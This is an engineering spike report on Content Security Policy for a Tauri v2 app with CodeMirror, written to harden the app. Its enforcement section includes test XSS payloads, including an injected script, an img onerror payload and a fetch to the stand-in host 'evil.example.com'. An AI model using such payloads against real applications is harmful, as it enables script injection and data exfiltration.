# SPIKE — CSP behavior on Tauri v2 + CodeMirror style accommodation

| Field | Value |
|---|---|
| Task | SEC-3 (kanban t_e3b26f82), answers PRD R1.5/R1.7 + Q1/Q2 |
| Author | crew-coding-architect |
| Status | Findings + recommendation for SEC-4 (frontend implementation) |
| Versions measured | tauri 2.12.1, tauri-utils 2.10.1, tauri-codegen 2.7.1, wry 0.57.0 (cargo registry sources), style-mod 4.1.4, @codemirror/view 6.43.14, vite 8.0.16 — all matching this repo's lockfiles |
| Method | Cargo-registry source reading (file:line below), Tauri v2 docs, `dist/` audit, live Chromium enforcement harness with the exact draft policy string (code + results in §5). No repo files modified; `tauri.conf.json` untouched. |

**TL;DR:** (1) Tauri v2 does **not** auto-append `ipc: http://ipc.localhost` to `connect-src` — write them manually. It does auto-append its own script/style nonces. (2) `'unsafe-inline'` in `style-src` is the right CodeMirror accommodation, and it works **only because** the built HTML contains no `<style>` element — a nonce landing in `style-src` silently kills `'unsafe-inline'` (proven in Chromium). (3) Draft policy below. (4) Enforcement proof: harness ran today; one-time real-WebView2 proof stays with SEC-4/Q7.

---

## 1. Q2 — Does Tauri v2 auto-append IPC origins to `connect-src`?

**No. Manual.** Evidence:

- `tauri-utils-2.10.1/src/config.rs:2885,2900` — the official config doc example writes `csp: "default-src 'self'; connect-src ipc: http://ipc.localhost"` **in the config itself**, and the rendered header carries those values through verbatim. Same shape in the official docs example (<https://v2.tauri.app/security/csp/>).
- `grep -rn '"ipc:"|ipc\.localhost'` across `tauri-2.12.1/src` + `tauri-utils-2.10.1/src` → **only doc comments, zero code** appends anything to `connect-src`.
- `tauri-2.12.1/src/manager/mod.rs:53-113` (`set_csp`) — the only runtime CSP modification is: replace `__TAURI_SCRIPT_NONCE__` / `__TAURI_STYLE_NONCE__` tokens with random per-load values + append the matching `'nonce-<v>'` sources, plus build-time inline-script hashes (`CspHash::Script/Style`). No IPC logic anywhere.
- `config.rs:2576` `From<Csp> for HashMap` — pure string parse, no additions.

**Why the origins are needed at all (mechanism, not folklore):**

- IPC primary transport is `fetch(convertFileSrc(cmd, 'ipc'), {method:'POST'})` — `tauri-2.12.1/scripts/ipc-protocol.js:16-37`; `canUseCustomProtocol = osName !== 'android'` → used on Windows and Linux. `convertFileSrc(cmd,'ipc')` resolves to `http://ipc.localhost/<cmd>` on Windows, `ipc://localhost/<cmd>` elsewhere (mock helper in `scripts/bundle.global.js`).
- Page origin in prod is `http://tauri.localhost` (Windows) / `tauri://localhost` (Linux) → the IPC fetch is cross-origin → governed by `connect-src` → **must be listed explicitly**. For this app (Windows-first, developed on Linux): `http://ipc.localhost` covers Windows, `ipc:` covers Linux.

**What Tauri DOES auto-modify (so SEC-4 must not "fix" it):** `script-src` gains `'nonce-<v>'` at runtime (codegen adds `nonce="__TAURI_SCRIPT_NONCE__"` to every `<script>` in the built HTML — `tauri-codegen-2.7.1/src/context.rs:80` → `tauri-utils-2.10.1/src/html.rs:148-156` `inject_nonce_token`). Our `dist/index.html` has exactly one `<script type="module" src>` and zero inline scripts, so this is harmless and `script-src 'self'` as written is correct. Tauri's own init scripts (`__TAURI_INTERNALS__`, the `withGlobalTauri` bundle) are injected via the webview's native initialization-script API and bypass CSP entirely. Keep `dangerousDisableAssetCspModification` at its default (`false`).

## 2. Q1 — CodeMirror style-mod accommodation: hash / nonce / `'unsafe-inline'`

**Recommendation: `style-src 'self' 'unsafe-inline'`, nothing else. Q1's condition is proven: hashes are impractical, nonce plumbing is disproportionate.**

Evidence:

- `style-mod@4.1.4` (`node_modules/style-mod/dist/style-mod.cjs`): for a document root it does `doc.createElement("style")` + sets `textContent` to the generated rules + inserts into `head` (`StyleSet` constructor + `StyleSet.prototype.mount`). CSP sees a runtime-injected inline style element — exactly the thing `style-src` polices.
- **Hash impractical:** rules are generated at runtime; class names come from `StyleModule.newName()` (counter: `ͼ1`, `ͼ2`, …). The CSS text is unknown at policy-write time and changes with extension set/order. A hash pinned today breaks silently on the next dep bump.
- **Nonce possible but disproportionate:** style-mod accepts `{nonce}` (`StyleModule.mount(root, mods, {nonce})`) and `@codemirror/view@6.43.14` exposes the `EditorView.cspNonce` facet (`dist/index.js:8350`, docs at `:9008-9010`). But the only nonce Tauri generates at runtime reaches the DOM through the `__TAURI_STYLE_NONCE__` token in the served HTML — the app would need a dummy `<style nonce="__TAURI_STYLE_NONCE__">` in `index.html`, read its `.nonce` at startup, and feed it to `EditorView.cspNonce.of(n)`. Permanent HTML artifact + startup coupling + fragile ordering, to protect `style-src` — while the actual XSS primitive (`innerHTML` script injection) is already covered by strict `script-src`, and CSS-based exfiltration is blocked by strict `connect-src`. Not worth it.
- **THE TRAP (Chromium-proven, §5 run 2):** if a nonce source is present in `style-src`, browsers **ignore `'unsafe-inline'`** (CSP3 spec) → runtime-injected styles get blocked → editor renders unstyled. This matters because tauri-codegen adds a style nonce token only if the built HTML contains `<style>` elements. Today `dist/index.html` (Vite 8 output) has **zero** `<style>` and one external `<script src>` + one `<link rel=stylesheet>` — so no style token is injected, `style-src` reaches the webview exactly as written, and `'unsafe-inline'` is effective (§5 run 1: style applied, zero style violations).
- **Guard for the trap:** the smoke suite's CSP-violation counter (R1.4) fails the build if anything changes the equation. Do not switch Vite to inlining CSS (`build.assetsInlineLimit` games, `cssCodeSplit:false`-style changes) without re-running this analysis.
- xterm needs no accommodation: its CSS is a bundle import (`src/main.ts:8`) → ships inside the external `.css` file. `src/` contains no `data:`/`blob:` URIs, no `Worker`, no `eval`/`new Function`, no `@import`/`@font-face` (grepped).

Escape hatch if MEKL ever demands a nonce-strict `style-src`: the `EditorView.cspNonce` + dummy-token pattern above, documented here so it isn't rediscovered from scratch.

## 3. Q3 — Draft policy (concrete)

**Prod — the `app.security.csp` value:**

```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self'; font-src 'self'; connect-src 'self' ipc: http://ipc.localhost; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
```

Directive-by-directive:

| Directive | Sources | Why |
|---|---|---|
| `default-src` | `'self'` | deny-by-default floor; `'self'` = `http://tauri.localhost` (Win) / `tauri://localhost` (Linux) |
| `script-src` | `'self'` | bundle is one external file (`dist/assets/index-*.js`); zero inline scripts in HTML; Tauri appends its own `'nonce-…'` at runtime (§1). **Never relax further (PRD R1.6).** |
| `style-src` | `'self' 'unsafe-inline'` | `'self'`: external stylesheet; `'unsafe-inline'`: CodeMirror style-mod runtime `<style>` (§2). Sole relaxation; named per R1.6. |
| `img-src` | `'self'` | no `data:`/`blob:` image usage found → PRD says drop `data:` unless proven; harness showed no img violations. If the Windows matrix trips on xterm underline decorations (they're text, not images — not expected), add `data:` with a comment naming the culprit. |
| `font-src` | `'self'` | system font stacks only; no `@font-face`. Belt-and-braces; could be omitted (falls back to `default-src`) but explicit is free. |
| `connect-src` | `'self' ipc: http://ipc.localhost` | `'self'`: nothing external today but keeps same-origin fetch working; `ipc:` (Linux) + `http://ipc.localhost` (Windows): IPC transport (§1). **Manual — no auto-append.** |
| `object-src` | `'none'` | no plugins, ever |
| `base-uri` | `'self'` | blocks injected `<base>` hijack |
| `frame-ancestors` | `'none'` | ignored in `<meta>` (fine); effective in the prod response header |

Not present, deliberately: `wasm-unsafe-eval` (no wasm), `worker-src` (falls back to `script-src`; no workers), `form-action` (no `<form>` submits — every modal is JS-driven), `frame-src` (no frames).

**Dev — and the dev/prod delivery gap (TSD §3.1 spike item 1):**

- **With `devUrl` set (our setup: `http://localhost:1420`), Tauri does NOT inject the CSP.** The only CSP consumers are `manager/mod.rs:427` (`get_asset`, embedded assets = prod custom protocol) and `protocol/tauri.rs:182` (response header on embedded assets). Vite serves dev pages; Tauri never touches those responses. The config-schema sentence "this value is also injected on dev" (`config.rs:3041`) holds only when Tauri itself serves the frontend (no `devUrl`) — not our case.
- Therefore PRD R1.1 "dev server covered" needs Vite-side delivery: `vite.config.ts` → `server.headers: { "Content-Security-Policy": "<dev policy>" }`. Dev policy = prod policy with **one addition**: `ws://localhost:1420` in `connect-src` (Vite HMR websocket). `'self'` already covers dev scripts/CSS (same origin), `'unsafe-inline'` already covers Vite's dev-mode style injection.
- The string will exist twice (tauri.conf.json + vite.config.ts). Mitigation: comment in vite.config.ts pointing at `tauri.conf.json` as the source of truth. Meta tag in `index.html` rejected (TSD forbids; would also leak the dev policy into prod HTML). `devCsp` config key rejected (unreachable for `devUrl` setups — evidence above).
- Note: the Playwright smoke suite serves `dist/` from its own server on `:4199` — SEC-4 adds the **prod** policy as a response header there, which is what makes the R1.4 violation-counter check meaningful.

## 4. Q4 / R1.5 — How to prove enforcement

- **Delivery mechanism (source-verified):** prod = CSP response header on every embedded-asset response (`protocol/tauri.rs:182-183`); additionally on Linux the parsed policy is injected as a `<meta http-equiv>` into served HTML (`manager/mod.rs:429` + `html2::inject_csp`). WebView2 uses the header path.
- **Engine-level proof (done today, headless Chromium, exact policy string delivered as a response header):** harness page receives the policy, then a same-origin external script (allowed by `'self'`) attempts four attacks and records `securitypolicyviolation` events. Run 1, prod policy:

  | Attack | Result | Violation recorded |
  |---|---|---|
  | DOM-injected inline `<script>` (`s.textContent="window.__xss=1"`) | **blocked — payload never ran** (`__xss===0`) | `script-src-elem` ×2 |
  | `new Function("…")` | **blocked** (EvalError) | `script-src` (eval) |
  | `fetch('http://evil.example.com/beacon')` | **blocked** | `connect-src` |
  | style-mod-pattern `<style>` injection | **applied** (`computedStyle.color` = red), zero violations | — |

  Run 2 (same policy + `'nonce-abc123'` added to `style-src`, simulating what happens if a `<style>` ever appears in the built HTML): the same style injection **breaks** (`style-src-elem` violation) while `'unsafe-inline'` is present — confirming the §2 trap. Harness code lives in the run log of this task; it is throwaway by design (TSD: spike notes are the deliverable).
- **One-time real-build proof (SEC-4 + Q7, cannot be executed from this Linux box against WebView2):** in the built app's devtools console run `document.body.innerHTML += '<img src=x onerror="window.__pwned=1"><script>window.__pwned=1</script>'` → assert `window.__pwned === undefined` and exactly the `script-src-elem` violations appear in console. Paste command + result into the SEC-4 PR description (AC R1.5). The Chromium harness above is the same policy semantics; WebView2 is Chromium-based (Q7 accepts the residual drift, checked once manually).
- **Ongoing enforcement:** R1.4 smoke check — attach the prod policy header in `qa-reports/headless-smoke.mjs`'s static server, collect `securitypolicyviolation` events across the whole run, assert count == 0. This also empirically covers xterm/`addon-fit` (TSD §3.1 item 5: neither touches CSP-relevant APIs by import graph — CSS bundle import, DOM renderer, no workers/eval — the smoke run is the empirical confirmation).

## 5. Residual risks for SEC-4 / lead

| Risk | Handling |
|---|---|
| Vite CSS inlining would plant `<style>` in HTML → style nonce in `style-src` → `'unsafe-inline'` neutralized → CodeMirror breaks | Prohibited-by-review note; smoke violation counter backstops. Re-run this spike if CSS delivery changes. |
| CSP string duplicated (tauri.conf.json + vite.config.ts dev header) | Comment cross-reference; smoke suite asserts the prod policy string is the one it serves. |
| WebView2-specific drift (hash/nonce edge behavior, `ipc.localhost` handling) | Q7 one-time manual Windows matrix before wave tag; not automatable from Linux. |
| Someone "fixes" the missing `ipc:` origins out of `connect-src` | This doc is the reference; PR review checklist item. |
| Future inline `<script>` in `index.html` | Would get codegen hash/nonce treatment automatically — but keep zero-inline discipline anyway; `script-src` must never gain `'unsafe-inline'` (R1.6). |

## 6. Answers for the dispatching docs (one-liners)

- **Q2 (PRD):** No auto-append. `connect-src 'self' ipc: http://ipc.localhost` must be written in the config (tauri-2.12.1 has no IPC-origin append code; official docs example carries them manually).
- **Q1 (PRD):** `'unsafe-inline'` scoped to `style-src` — per-injection hashes proven impractical for style-mod (runtime-generated rules/class names); nonce impractical without DOM plumbing; trap documented (nonce neutralizes `'unsafe-inline'`).
- **R1.7:** dev (`devUrl`) gets **no** Tauri CSP injection → dev coverage via `server.headers` in vite.config.ts + `ws://localhost:1420`; prod policy single-sourced in `tauri.conf.json`.
- **R1.5:** engine proof done in Chromium today (inline script blocked, payload not executed); real-WebView2 one-liner specified in §4 for SEC-4/Q7.
